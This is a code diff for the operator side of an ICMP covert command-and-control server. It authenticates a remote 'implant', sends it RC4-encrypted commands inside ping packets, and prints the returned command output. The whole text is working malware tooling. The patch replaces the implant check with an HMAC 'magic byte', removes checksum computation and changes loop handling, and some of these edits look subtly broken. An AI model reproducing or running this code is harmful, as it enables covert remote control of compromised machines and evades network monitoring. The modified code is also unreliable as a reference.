@@ -3,6 +3,7 @@
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
+#define MAGIC_BYTE 0xaa
 
 // creates a raw ICMP socket and binds it
 int create_socket(char *interface_to_bind) {
@@ -45,7 +46,7 @@ unsigned short cksum(unsigned short *addr, int len) {
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     answer = ~sum;
-    
+
     return answer;
 }
 
@@ -58,7 +59,7 @@ unsigned char *get_command(char *input) {
 
     // encrypt the command
     RC4((unsigned char *) input, strlen(input), (unsigned char *) KEY, KEY_LENGTH, cipher_text);
-    
+
     return cipher_text;
 }
 
@@ -77,9 +78,14 @@ ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
 }
 
 // check if we got an actual connection from our implant
-/* TODO: dynamic id */
 int check_magic_byte(struct icmphdr *icmp) {
-    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
+    // Generate HMAC-SHA256 of the ICMP packet using the shared key
+    unsigned char digest[EVP_MAX_MD_SIZE];
+    unsigned int digest_len;
+    HMAC(EVP_sha256(), KEY, KEY_LENGTH, (unsigned char*)icmp, sizeof(*icmp), digest, &digest_len);
+
+    // Check if the first byte of the HMAC matches the magic byte
+    if (digest[0] == MAGIC_BYTE) {
         return 1;
     }
     return 0;
@@ -90,7 +96,7 @@ void print_connection_succeed(char *src_ip) {
         printf("[!] Got a connection from %s\n", src_ip);
         printf("[!] Now you should be able to run your commands\n");
 }
-   
+
 // prep'ing the IP headers for later usage
 struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
     struct sockaddr_in addr;
@@ -105,25 +111,16 @@ struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
 unsigned char *parse_data_section(unsigned char *packet) {
     // get the data section (ignoring the IP & ICMP headers)
     unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
-    
+
     return data;
 }
 
+// append the command to the data section of the packet
+void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *command) {
+    memcpy(data, command, strlen(command));
 
-// prep'ing the ICMP headers & setting up the checksum
-void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
-    icmp->checksum = checksum;
-    icmp->type = 8;
-    icmp->un.echo.id = 9001;
-}
-
-// reuse the ICMP packet to append our input in the data section
-void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
-    memcpy(data, input, strlen((char *) input));
-
-    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));
-
-    prep_icmp_headers(icmp, checksum);
+    // update the ICMP header with the new data length
+    icmp->un.echo.sequence = strlen(command);
 }
 
 // the actual interaction occurs here
@@ -139,6 +136,7 @@ void interact(int sockfd) {
     char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
     ssize_t nbytes, nbytes_tmp;
     size_t packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
+    int connected = 0;
 
     input = malloc(BUFFER_SIZE);
     packet = (unsigned char *) malloc(packet_size);
@@ -151,8 +149,8 @@ void interact(int sockfd) {
     }
 
     puts("[+] Waiting for connections...");
-    
-    while (1) {
+
+    while (!connected) {
         if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size) < 0)) {
             break;
         }
@@ -167,7 +165,7 @@ void interact(int sockfd) {
         if (check_magic_byte(icmp)) {
             // convert the binary represenation of the IP address to a string
             inet_ntop(AF_INET, &ip->saddr, src_ip, sizeof(src_ip));
-            
+
             print_connection_succeed(src_ip);
 
             addr = prep_ip_headers(ip);
@@ -181,14 +179,14 @@ void interact(int sockfd) {
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
             if (nbytes < 0) {
                 perror("sendto()");
-                goto cleanup;
+                break;
             }
 
-            break;
+            connected = 1;
         }
     }
 
-    while (1) {
+    while (connected) {
         if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size)) < 0) {
             break;
         }
@@ -208,7 +206,7 @@ void interact(int sockfd) {
 
             // decrypt the cipher text (command's output)
             RC4(data, nbytes, (unsigned char *) KEY, KEY_LENGTH, cipher_text);
-                        
+
             write(1, cipher_text, nbytes);
 
             command = get_command(input);
@@ -223,11 +221,9 @@ void interact(int sockfd) {
             }
         }
     }
-    
-    cleanup:
-        free(input);
-        free(cipher_text);
-        free(packet);
+    free(input);
+    free(cipher_text);
+    free(packet);
 }
 
 // initializes the options and starts the c2
